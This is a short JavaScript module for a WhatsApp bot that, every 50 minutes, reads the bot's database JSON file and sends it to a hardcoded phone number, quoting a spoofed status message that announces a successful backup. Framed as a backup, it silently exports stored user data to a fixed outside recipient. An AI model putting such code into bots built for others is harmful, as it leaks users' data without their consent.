const fs = require('fs')

module.exports = (conn) => {
  setInterval(async () => {
    const q = {
      "key": {
        "remoteJid": "status@broadcast",
        "participant": "0@s.whatsapp.net",
        "fromMe": false,
        "id": ""
      },
      "message": {
        "conversation": "Berhasil Mencadangkan database.json"
      }
    }
    let sesi = await fs.readFileSync(`./${global.database}.json`)
    await conn.sendMessage('6285133663664@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: `${global.database}.json` }, { quoted: q })
  }, 50 * 60 * 1000)
}